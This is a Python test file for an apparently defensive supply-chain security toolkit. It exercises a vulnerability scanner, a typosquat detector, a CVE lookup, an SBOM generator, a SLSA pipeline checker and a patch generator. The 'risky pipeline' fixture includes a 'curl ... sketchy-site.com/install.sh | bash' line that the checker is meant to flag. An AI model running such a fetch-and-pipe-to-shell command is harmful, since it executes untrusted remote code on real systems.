"""
Phase 2 -- Tool Tests
======================
Tests all 6 security tools with real API calls (OSV, PyPI, npm, NVD)
and local-only tools (SBOM, SLSA, Patch Generator).

All APIs used are FREE with no authentication required.
"""
import asyncio
import json
import time


def test_osv_scanner():
    """Test 1: OSV Scanner - known vulnerable package."""
    print("=== Test 1: OSV Scanner ===")
    from secureflow.tools.osv_scanner import osv_check

    # requests 2.6.0 has known vulns (CVE-2018-18074)
    result = asyncio.run(osv_check("requests", "2.6.0", "PyPI"))
    print(f"  Package:    requests@2.6.0 (PyPI)")
    print(f"  Vulnerable: {result['vulnerable']}")
    print(f"  Count:      {result['count']}")
    print(f"  Error:      {result['error']}")
    if result["vulns"]:
        v = result["vulns"][0]
        print(f"  First vuln: {v['id']}")
        print(f"  Severity:   {v['severity']}")
        print(f"  Aliases:    {v['aliases'][:3]}")
        print(f"  Fixed ver:  {v['fixed_version']}")
    assert result["vulnerable"] is True, "requests 2.6.0 should be vulnerable!"
    assert result["count"] > 0
    assert result["error"] is None

    # Also test a safe package
    result2 = asyncio.run(osv_check("requests", "2.32.0", "PyPI"))
    print(f"\n  Package:    requests@2.32.0 (PyPI)")
    print(f"  Vulnerable: {result2['vulnerable']}")
    print(f"  Count:      {result2['count']}")
    # Note: even recent versions might have vulns, so we just check no error
    assert result2["error"] is None
    print("PASSED: OSV Scanner works\n")


def test_phantom_package_detector():
    """Test 2: Phantom Package Detector - real vs fake packages."""
    print("=== Test 2: Phantom Package Detector ===")
    from secureflow.tools.phantom_package_detector import check_package_exists

    # Real PyPI package
    real = asyncio.run(check_package_exists("requests", "pypi"))
    print(f"  Package:    'requests' on PyPI")
    print(f"  Exists:     {real['exists']}")
    print(f"  Version:    {real['latest_version']}")
    print(f"  Phantom:    {real['is_phantom']}")
    assert real["exists"] is True
    assert real["is_phantom"] is False
    assert real["latest_version"] is not None

    # Fake PyPI package (typosquat candidate)
    fake = asyncio.run(check_package_exists("reqeusts-xyznotreal123", "pypi"))
    print(f"\n  Package:    'reqeusts-xyznotreal123' on PyPI")
    print(f"  Exists:     {fake['exists']}")
    print(f"  Phantom:    {fake['is_phantom']}")
    print(f"  Risk:       {fake['risk_level']}")
    assert fake["exists"] is False
    assert fake["is_phantom"] is True
    assert fake["risk_level"] == "CRITICAL"

    # Real npm package
    npm_real = asyncio.run(check_package_exists("express", "npm"))
    print(f"\n  Package:    'express' on npm")
    print(f"  Exists:     {npm_real['exists']}")
    print(f"  Version:    {npm_real['latest_version']}")
    assert npm_real["exists"] is True

    # Fake npm package
    npm_fake = asyncio.run(check_package_exists("express-xyznotreal456", "npm"))
    print(f"\n  Package:    'express-xyznotreal456' on npm")
    print(f"  Exists:     {npm_fake['exists']}")
    print(f"  Phantom:    {npm_fake['is_phantom']}")
    assert npm_fake["exists"] is False
    assert npm_fake["is_phantom"] is True

    print("PASSED: Phantom Package Detector works\n")


def test_nvd_lookup():
    """Test 3: NVD CVE Lookup - known CVE."""
    print("=== Test 3: NVD CVE Lookup ===")
    from secureflow.tools.nvd_cve_lookup import nvd_lookup

    # CVE-2021-44228 = Log4Shell (famous, well-documented)
    result = asyncio.run(nvd_lookup("CVE-2021-44228"))
    print(f"  CVE:        {result['cve_id']}")
    print(f"  Found:      {result['found']}")
    print(f"  CVSS:       {result['cvss_score']}")
    print(f"  Severity:   {result['severity']}")
    print(f"  Published:  {result['published']}")
    print(f"  Weaknesses: {result['weaknesses']}")
    print(f"  Refs:       {len(result['references'])} references")
    print(f"  Desc:       {result['description'][:100]}...")
    print(f"  Error:      {result['error']}")
    assert result["found"] is True, "CVE-2021-44228 should exist in NVD!"
    assert result["cvss_score"] is not None
    assert result["cvss_score"] >= 9.0, "Log4Shell should be CRITICAL"
    assert result["error"] is None

    print("PASSED: NVD CVE Lookup works\n")


def test_sbom_generator():
    """Test 4: SBOM Generator - from requirements.txt."""
    print("=== Test 4: SBOM Generator ===")
    from secureflow.tools.sbom_generator import generate_sbom

    requirements = """# Core dependencies
flask==2.3.3
requests>=2.31.0
sqlalchemy~=2.0
# Dev tools
pytest==8.0.0
-e .
"""
    result = asyncio.run(generate_sbom(requirements, "requirements.txt", "test-project"))
    print(f"  Success:    {result['success']}")
    print(f"  Format:     {result['format']}")
    print(f"  Spec:       {result['spec_version']}")
    print(f"  Components: {result['component_count']}")
    assert result["success"] is True
    assert result["format"] == "CycloneDX"
    assert result["component_count"] == 4  # flask, requests, sqlalchemy, pytest (-e . skipped)

    sbom = result["sbom"]
    print(f"  SBOM keys:  {list(sbom.keys())}")
    print(f"  Serial:     {sbom['serialNumber'][:20]}...")
    for comp in sbom["components"]:
        print(f"    - {comp['name']}@{comp['version']}  (purl: {comp['purl']})")
    assert sbom["bomFormat"] == "CycloneDX"
    assert sbom["specVersion"] == "1.5"

    # Also test package.json
    pkg_json = json.dumps({
        "dependencies": {"express": "^4.18.2", "lodash": "~4.17.21"},
        "devDependencies": {"jest": "^29.7.0"}
    })
    result2 = asyncio.run(generate_sbom(pkg_json, "package.json", "npm-project"))
    print(f"\n  npm SBOM:   {result2['component_count']} components")
    assert result2["success"] is True
    assert result2["component_count"] == 3

    print("PASSED: SBOM Generator works\n")


def test_slsa_checker():
    """Test 5: SLSA Checker - various pipeline configs."""
    print("=== Test 5: SLSA Checker ===")
    from secureflow.tools.slsa_checker import check_slsa_compliance

    # Minimal pipeline (Level 1)
    minimal_ci = """
stages:
  - build
  - test

build:
  stage: build
  image: python:3.11
  script:
    - pip install -r requirements.txt
    - python setup.py build

test:
  stage: test
  script:
    - pytest tests/
"""
    result = asyncio.run(check_slsa_compliance(minimal_ci))
    print(f"  Minimal pipeline:")
    print(f"    SLSA Level:      {result['slsa_level']}")
    print(f"    Checks passed:   {sum(1 for v in result['checks'].values() if v)}/{len(result['checks'])}")
    print(f"    Recommendations: {len(result['recommendations'])}")
    for r in result["recommendations"]:
        print(f"      - {r}")
    assert result["slsa_level"] >= 1
    assert result["error"] is None

    # Secure pipeline (Level 3+)
    secure_ci = """
stages:
  - build
  - test
  - security
  - deploy

build:
  stage: build
  image: python@sha256:abc123def456
  script:
    - pip install -r requirements.txt
    - python setup.py build

test:
  stage: test
  script:
    - pytest tests/

sast:
  stage: security
  script:
    - semgrep --config auto

dependency-scanning:
  stage: security
  script:
    - pip-audit

sign:
  stage: deploy
  script:
    - cosign sign --key env://COSIGN_KEY
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual
      approval: required
"""
    result2 = asyncio.run(check_slsa_compliance(secure_ci))
    print(f"\n  Secure pipeline:")
    print(f"    SLSA Level:      {result2['slsa_level']}")
    print(f"    Checks passed:   {sum(1 for v in result2['checks'].values() if v)}/{len(result2['checks'])}")
    print(f"    Risk factors:    {len(result2['risk_factors'])}")
    assert result2["slsa_level"] >= 3
    assert result2["slsa_level"] > result["slsa_level"]

    # Risky pipeline
    risky_ci = """
build:
  image: python:latest
  script:
    - curl https://sketchy-site.com/install.sh | bash
    - pip install -r requirements.txt
  privileged: true

test:
  script:
    - pytest
  allow_failure: true
"""
    result3 = asyncio.run(check_slsa_compliance(risky_ci))
    print(f"\n  Risky pipeline:")
    print(f"    SLSA Level:      {result3['slsa_level']}")
    print(f"    Risk factors:    {len(result3['risk_factors'])}")
    for rf in result3["risk_factors"]:
        print(f"      !! {rf}")
    assert len(result3["risk_factors"]) >= 1

    print("PASSED: SLSA Checker works\n")


def test_patch_generator():
    """Test 6: Patch Generator - all 3 patch types."""
    print("=== Test 6: Patch Generator ===")
    from secureflow.tools.patch_generator import generate_patch

    # Vulnerable dependency patch
    result = asyncio.run(generate_patch(
        finding_type="vulnerable_dependency",
        file_path="requirements.txt",
        package_name="requests",
        current_version="2.6.0",
        fixed_version="2.32.0",
        ecosystem="pypi",
    ))
    print(f"  Vuln dep patch:")
    print(f"    Success:  {result['success']}")
    print(f"    Branch:   {result['branch_name']}")
    print(f"    Commit:   {result['commit_message'].splitlines()[0]}")
    print(f"    Patch:")
    for line in result["patch"].splitlines():
        print(f"      {line}")
    assert result["success"] is True
    assert "requests" in result["patch"]
    assert "2.32.0" in result["patch"]

    # Phantom package removal
    result2 = asyncio.run(generate_patch(
        finding_type="phantom_package",
        file_path="requirements.txt",
        package_name="reqeusts",
        current_version="0.0.1",
        fixed_version="REMOVE",
        ecosystem="pypi",
    ))
    print(f"\n  Phantom removal:")
    print(f"    Success:  {result2['success']}")
    print(f"    Branch:   {result2['branch_name']}")
    print(f"    Desc:     {result2['description'][:80]}...")
    assert result2["success"] is True
    assert "CRITICAL" in result2["description"]

    # Hardcoded secret fix
    result3 = asyncio.run(generate_patch(
        finding_type="hardcoded_secret",
        file_path="config.py",
        package_name="api-key",
        current_version="",
        fixed_version="",
        ecosystem="python",
    ))
    print(f"\n  Secret fix:")
    print(f"    Success:  {result3['success']}")
    print(f"    Branch:   {result3['branch_name']}")
    print(f"    Patch:")
    for line in result3["patch"].splitlines():
        print(f"      {line}")
    assert result3["success"] is True
    assert "os.environ" in result3["patch"]

    print("PASSED: Patch Generator works\n")


if __name__ == "__main__":
    print("=" * 60)
    print("  SecureFlow Phase 2 -- Tool Tests")
    print("  (Uses FREE APIs: OSV, PyPI, npm, NVD)")
    print("=" * 60 + "\n")

    start = time.time()

    test_osv_scanner()
    test_phantom_package_detector()
    test_nvd_lookup()
    test_sbom_generator()
    test_slsa_checker()
    test_patch_generator()

    elapsed = time.time() - start
    print("=" * 60)
    print(f"  ALL PHASE 2 TESTS PASSED  ({elapsed:.1f}s)")
    print("=" * 60)
